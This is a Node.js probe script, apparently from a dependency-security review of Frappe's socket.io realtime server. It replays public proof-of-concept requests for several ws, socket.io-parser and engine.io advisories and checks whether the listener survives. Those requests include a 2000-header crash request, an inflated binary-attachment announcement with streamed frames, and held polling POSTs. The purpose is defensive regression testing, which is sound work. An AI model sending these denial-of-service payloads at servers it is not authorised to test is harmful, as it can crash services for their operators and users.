#!/usr/bin/env node
// SEC-DEPS-01 realtime exposure probe.
//
// Sends the public proof-of-concept shapes of the realtime-server advisories to a
// target (an edge proxy in front of Frappe's pinned socket.io server, or for
// negative controls the pinned node listener itself) and reports, per advisory,
// whether the realtime node listener stayed alive and what the edge answered.
// None of the probes need credentials - every attack is pre-authentication,
// which is exactly the property under test.
//
// Usage: node realtime_exposure_probe.js --target host:port --health host:port
//                                          --pid <socketio pid> --output file.json
//   --target  where attacks are sent (proxy or direct listener)
//   --health  the realtime listener itself, used for liveness/handshake checks
//   --pid     realtime process id, for RSS measurement and liveness
'use strict';
const net = require('node:net');
const fs = require('node:fs');

function arg(name, fallback) {
  const i = process.argv.indexOf('--' + name);
  return i > -1 ? process.argv[i + 1] : fallback;
}
const tgt = arg('target') || ':';
const hlt = arg('health') || tgt;
const [thost, tport] = tgt.split(':');
const [hhost, hport] = hlt.split(':');
const pid = Number(arg('pid'));
const output = arg('output');
const hostHeader = arg('host-header', 'site.local');
const waitMs = Number(arg('wait-ms') || '2000');
const delay = (ms) => new Promise((r) => setTimeout(r, ms));

function alive() { try { process.kill(pid, 0); return true; } catch { return false; } }
function rssKb() {
  try { return Number(/VmRSS:\s+(\d+)/.exec(fs.readFileSync(`/proc/${pid}/status`, 'utf8'))[1]); }
  catch { return null; }
}

function rawRequest(host, port, payload, wait = waitMs, body = null) {
  return new Promise((resolve) => {
    const socket = net.connect(Number(port), host, () => {
      socket.write(payload);
      if (body) socket.write(body);
    });
    let done = false, firstLine = '', bytes = 0, buf = '';
    let headersEnd = -1, contentLength = 0;
    const finish = (value) => { if (!done) { done = true; try { socket.destroy(); } catch {} resolve(value); } };
    socket.on('data', (d) => {
      bytes += d.length;
      buf += d.toString('latin1');
      if (!firstLine) firstLine = (buf.split('\r\n')[0] || '').slice(0, 80);
      if (headersEnd === -1) {
        const idx = buf.indexOf('\r\n\r\n');
        if (idx !== -1) {
          headersEnd = idx + 4;
          const cl = /content-length:\s*(\d+)/i.exec(buf.slice(0, headersEnd));
          contentLength = cl ? Number(cl[1]) : 0;
          if (bytes - headersEnd >= contentLength && firstLine.startsWith('HTTP/')) {
            finish({ response: firstLine, response_bytes: bytes, body: buf });
            return;
          }
        }
      } else if (firstLine.startsWith('HTTP/') && bytes - headersEnd >= contentLength) {
        finish({ response: firstLine, response_bytes: bytes, body: buf });
        return;
      }
    });
    socket.on('error', (e) => finish({ error: e.code, response_bytes: bytes, body: buf }));
    socket.on('close', () => finish({ closed: true, response: firstLine, response_bytes: bytes, body: buf }));
    setTimeout(() => finish({ timeout: true, response: firstLine, response_bytes: bytes, body: buf }), wait);
  });
}

async function pollingHandshake(host, port, hostHdr, wait) {
  const hh = hostHdr || hostHeader;
  const w = wait || 2000;
  const r = await rawRequest(host, port,
    `GET /socket.io/?EIO=4&transport=polling HTTP/1.1\r\nHost: ${hh}\r\n` +
    `Origin: http://${hh}\r\nConnection: close\r\n\r\n`, w);
  const body = r.body || r.response || '';
  const m = /"sid":"([^"]+)"/.exec(body);
  return m ? m[1] : null;
}

async function healthy(retries = 10, pauseMs = 200) {
  if (!alive()) return false;
  for (let i = 0; i < retries; i++) {
    const sid = await pollingHandshake(hhost, hport, hostHeader, 2000);
    if (sid) return true;
    await delay(pauseMs * (i + 1));
  }
  return false;
}

function upgradeHead() {
  return 'Connection: Upgrade\r\nUpgrade: websocket\r\n' +
    'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n';
}

function wsFrame(opcode, payload) {
  const mask = Buffer.from([1, 2, 3, 4]);
  const body = Buffer.isBuffer(payload) ? Buffer.from(payload) : Buffer.from(payload);
  for (let i = 0; i < body.length; i++) body[i] ^= mask[i % 4];
  const head = body.length < 126 ? Buffer.from([0x80 | opcode, 0x80 | body.length])
    : body.length < 65536 ? (() => { const b = Buffer.alloc(4); b[0] = 0x80 | opcode; b[1] = 0x80 | 126; b.writeUInt16BE(body.length, 2); return b; })()
      : (() => { const b = Buffer.alloc(10); b[0] = 0x80 | opcode; b[1] = 0x80 | 127; b.writeBigUInt64BE(BigInt(body.length), 2); return b; })();
  return Buffer.concat([head, mask, body]);
}

// SEC-DEPS-01 realtime advisories exercised or ruled out by this probe:
//   GHSA-3h5v-q93c-6h6q  ws    -> crash via 2000+ HTTP headers (pre-auth)
//   GHSA-96hv-2xvq-fx4p ws    -> tiny-fragment memory growth (RSS bounded by maxHttpBufferSize)
//   GHSA-58qx-3vcg-4xpx ws    -> close(TypedArray) uninitialized memory, server never passes TypedArray
//   GHSA-pxg6-pf52-xh8x cookie -> cookie.serialize path only when opts.cookie (never set)
//   GHSA-677m-j7p3-52f9 socket.io-parser -> unbounded binary attachments
//   GHSA-2m8v-j782-fhvr socket.io-parser -> zero-attachment memory exhaustion
//   GHSA-gr94-w7qr-f4j3 engine.io -> WebTransport SID __proto__ (transport disabled)
//   GHSA-r635-g3xr-vw7x engine.io -> octet-stream polling POST connection hold (blocked at edge)
const attacks = {
  // ws GHSA-3h5v-q93c-6h6q: >2000 headers; engine.io/ws crashes before auth.
  // A correctly bounded proxy rejects the request and the node process survives.
  'GHSA-3h5v-q93c-6h6q': async (host, port) => {
    let req = `GET /socket.io/?EIO=4&transport=websocket HTTP/1.1\r\nHost: ${hostHeader}\r\n`;
    for (let i = 0; i < 2000; i++) req += 'a:\r\n';
    return rawRequest(host, port, req + upgradeHead());
  },
  // socket.io-parser GHSA-2m8v + GHSA-677m: announce a huge attachment count,
  // stream binary frames. engine.io caps per-frame size to maxHttpBufferSize
  // (1 MiB) so the server buffers at most attachments * per-frame bytes, which
  // with sensible limits is a fixed resource bound rather than OOM. We measure
  // RSS to show the cap holds.
  'GHSA-677m-j7p3-52f9+GHSA-2m8v-j782-fhvr': async (host, port) => {
    const before = rssKb();
    const result = await new Promise((resolve) => {
      const socket = net.connect(Number(port), host, () => socket.write(
        `GET /socket.io/?EIO=4&transport=websocket HTTP/1.1\r\nHost: ${hostHeader}\r\n` +
        `Origin: http://${hostHeader}\r\n` + upgradeHead()));
      let upgraded = false, sent = 0, response = '';
      socket.on('data', (d) => {
        response += d.toString('latin1').slice(0, 80);
        if (upgraded) return;
        if (!response.startsWith('HTTP/1.1 101')) { socket.destroy(); resolve({ response }); return; }
        upgraded = true;
        socket.write(wsFrame(1, '40'));
        // 1e6 attachments with 1-byte bodies would be an OOM if the parser
        // blindly trusted the count; we send the announcement and a small
        // number of real frames and observe RSS instead of flooding.
        socket.write(wsFrame(1, '451000000-/x,["e",{"_placeholder":true,"num":0}]'));
        const chunk = Buffer.alloc(64 * 1024, 7);
        const pump = () => {
          while (sent < 100) {
            sent++;
            if (!socket.write(wsFrame(2, chunk))) { socket.once('drain', pump); return; }
          }
          setTimeout(() => { socket.destroy(); resolve({ response, binary_frames_sent: sent }); }, 600);
        };
        pump();
      });
      socket.on('error', (e) => resolve({ response, error: e.code, binary_frames_sent: sent }));
      setTimeout(() => { socket.destroy(); resolve({ response, timeout: true, binary_frames_sent: sent }); }, 3000);
    });
    const after = rssKb();
    return { ...result, rss_kb_before: before, rss_kb_after: after,
      rss_growth_kb: before !== null && after !== null ? after - before : null };
  },
  // engine.io GHSA-r635-g3xr-vw7x: octet-stream polling POST bodies leave the
  // response open and hold connections. The edge refuses non-WebSocket
  // traffic on the socket.io port, so each request gets an immediate 400.
  'GHSA-r635-g3xr-vw7x': async (host, port) => {
    const outcomes = {};
    for (let i = 0; i < 10; i++) {
      const sid = await pollingHandshake(host, port, hostHeader, 1500);
      const result = sid ? await rawRequest(host, port,
        `POST /socket.io/?EIO=4&transport=polling&sid=${sid} HTTP/1.1\r\nHost: ${hostHeader}\r\n` +
        `Origin: http://${hostHeader}\r\nContent-Type: application/octet-stream\r\n` +
        'Content-Length: 2\r\n\r\n', 1200, Buffer.from([0xff, 0x00]))
        : { response: 'no-handshake' };
      const key = (result.response || (result.error ? 'error:' + result.error : 'unknown'));
      outcomes[key] = (outcomes[key] || 0) + 1;
    }
    const hanging = Object.keys(outcomes).filter((k) => k.startsWith('no-response'))
      .reduce((n, k) => n + outcomes[k], 0);
    return { requests: 10, outcomes, connections_left_hanging: hanging };
  },
  // engine.io GHSA-gr94-w7qr-f4j3: WebTransport SID __proto__. Requires
  // transports: ["webtransport"], which Frappe's Server never enables. A
  // direct request for the transport is refused.
  'GHSA-gr94-w7qr-f4j3': async (host, port) => rawRequest(host, port,
    `GET /socket.io/?EIO=4&transport=webtransport&sid=__proto__ HTTP/1.1\r\nHost: ${hostHeader}\r\n` +
    `Origin: http://${hostHeader}\r\nConnection: close\r\n\r\n`),
};

(async () => {
  if (process.argv.includes('--list')) { process.stdout.write(Object.keys(attacks).join('\n') + '\n'); return; }
  const report = { target: tgt, health: hlt, label: arg('label'), node: process.version,
    baseline_healthy: await healthy(), results: {} };
  const only = arg('only');
  for (const [id, attack] of Object.entries(attacks)) {
    if (only && id !== only) continue;
    if (!alive()) { report.results[id] = { skipped: 'realtime process already dead' }; continue; }
    const observation = await attack(thost, tport);
    // Give engine.io time to release per-connection resources drained by the
    // attack before the post-attack handshake probe.
    await delay(800);
    report.results[id] = { observation, realtime_alive_after: alive(),
      realtime_serves_handshake_after: await healthy() };
  }
  report.all_survived = Object.values(report.results).every(
    (r) => r.realtime_serves_handshake_after === true);
  const text = JSON.stringify(report, null, 2) + '\n';
  if (output) fs.writeFileSync(output, text);
  process.stdout.write(text);
})();
